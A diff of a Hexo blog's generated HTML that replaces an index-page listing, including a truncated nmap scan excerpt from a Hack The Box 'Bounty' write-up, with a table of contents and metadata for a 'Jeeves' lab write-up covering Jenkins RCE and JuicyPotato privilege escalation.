-        HTB-Bounty
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
-        Informationnmap1234567891011┌──(kali㉿kali)-[~/Documents/htb]└─$ nmap -p- --min-rate 10000 10.10.10.93Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-16 08:21 EDTNmap scan report for 10.10.10.93H...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2023-08-17T22:54:08+08:00">2023-08-17</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/HTB/">HTB</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/HTB/" itemprop="url"><span itemprop="name">HTB</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2023/08/17/HTB-Bounty/' itemprop="url">
-            阅读全文
-          </a>
-        </div>
-      
-    </div>
-  
 
-</div>
+    <div id="layoutHelper-comments"></div>
 
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/17/hello-world/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="Yao">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="Yao">
-    <meta itemprop="description" content="">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2023/08/17/hello-world/"  itemprop="url">
-        Hello World
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
-        Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
-Qu...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2023-08-17T22:40:04+08:00">2023-08-17</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2023/08/17/hello-world/' itemprop="url">
-            阅读全文
-          </a>
-        </div>
-      
-    </div>
-  
+  </article>
 
-</div>
 
-          </div>
-        
-      
-    
-  </section>
-  
-    
-  
+
+
 
 
 </div>
@@ -2827,78 +2834,31 @@ Qu...
     
     
       
-<section class="widget blogger desktop ">
-  <div class='content'>
-    
-      
-        <a class='avatar flat-box rectangle' href='/about/'>
-          <img no-lazy src='https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/blog/img-b111ca14d9b6cfd9c9a88f2434a33546.jpg'/>
-        </a>
-      
-    
-    
-    
-  </div>
-</section>
-
-    
-  
-
-  
-    
-    
-      
-  
-  <section class="widget category desktop">
-    
-  <header>
-    
-      <a href='/blog/categories/'><i class="fas fa-folder-open fa-fw" aria-hidden="true"></i><span class='name'>文章分类</span></a>
-    
-  </header>
-
-
-    <div class='content'>
-      <ul class="entry navigation">
-        
-          <li><a class="flat-box"
-            title="/categories/HTB/" href="/categories/HTB/"
-            active-action="action-categoriesHTB"
-            ><div class='name'>HTB</div><div class='badge'>(2)</div></a></li>
-        
-      </ul>
-    </div>
-  </section>
-
-
-    
-  
-
-  
-    
-    
-      
-  
-  <section class="widget tagcloud desktop mobile">
-    
-  <header>
-    
-      <a href='/blog/tags/'><i class="fas fa-tags fa-fw" aria-hidden="true"></i><span class='name'>热门标签</span></a>
-    
-  </header>
-
-
-    <div class='content'>
-      <a href="/tags/HTB/" style="font-size: 24px; color: #555">HTB</a> <a href="/tags/RCE/" style="font-size: 14px; color: #999">RCE</a> <a href="/tags/jenkins/" style="font-size: 14px; color: #999">jenkins</a> <a href="/tags/juicy-potato/" style="font-size: 24px; color: #555">juicy potato</a> <a href="/tags/nishang/" style="font-size: 14px; color: #999">nishang</a> <a href="/tags/windows/" style="font-size: 24px; color: #555">windows</a>
-    </div>
-  </section>
-
-
     
   
 
 
 <div class="widget-sticky">
+
+  
+  
+
+
+<section class="widget toc-wrapper desktop" id="toc-div" >
+  
+  <header>
+    
+      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+  <div class='content'>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Information-x20"><span class="toc-number">1.</span> <span class="toc-text">Information </span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Port-Scan"><span class="toc-number">1.1.</span> <span class="toc-text">Port Scan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB-80"><span class="toc-number">1.2.</span> <span class="toc-text">WEB-80</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB-50000"><span class="toc-number">1.3.</span> <span class="toc-text">WEB - 50000</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-number">1.3.1.</span> <span class="toc-text">目录遍历</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB-x20"><span class="toc-number">2.</span> <span class="toc-text">WEB </span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jenkins-RCE"><span class="toc-number">2.1.</span> <span class="toc-text">jenkins RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Getshell"><span class="toc-number">2.2.</span> <span class="toc-text">Getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege"><span class="toc-number">3.</span> <span class="toc-text">Privilege</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#To-msf-shell"><span class="toc-number">3.1.</span> <span class="toc-text">To msf shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JuicyPotato"><span class="toc-number">3.2.</span> <span class="toc-text">JuicyPotato</span></a></li></ol></li></ol>
+  </div>
+</section>
+
+  
 
 </div>
 
@@ -3650,7 +3610,7 @@ window.matchMedia('(prefers-color-scheme: light)').addListener(darkModelListener
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Yao","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Yao","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Yao"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Yao","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"Yao","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Yao","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","description":"","inLanguage":["zh-CN","en","default"],"mainEntityOfPage":{"@type":"WebPage"},"author":{"@type":"Person","name":"Yao","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Yao","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"wordCount":0,"image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Yao","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Yao","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Yao"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/HTB/","name":"HTB"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2023/08/20/HTB-Jeeves/","name":"HTB-Jeeves"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Yao","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"Yao","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Yao","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"HTB-Jeeves","description":"","inLanguage":["zh-CN","en","default"],"mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2023/08/20/HTB-Jeeves/"},"author":{"@type":"Person","name":"Yao","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Yao","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2023/08/20/HTB-Jeeves/","wordCount":0,"datePublished":"2023-08-20T05:35:32.000Z","dateModified":"2023-08-20T07:18:38.295Z","articleSection":"HTB","keywords":"HTB,windows,juicy potato,nishang,jenkins,RCE","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
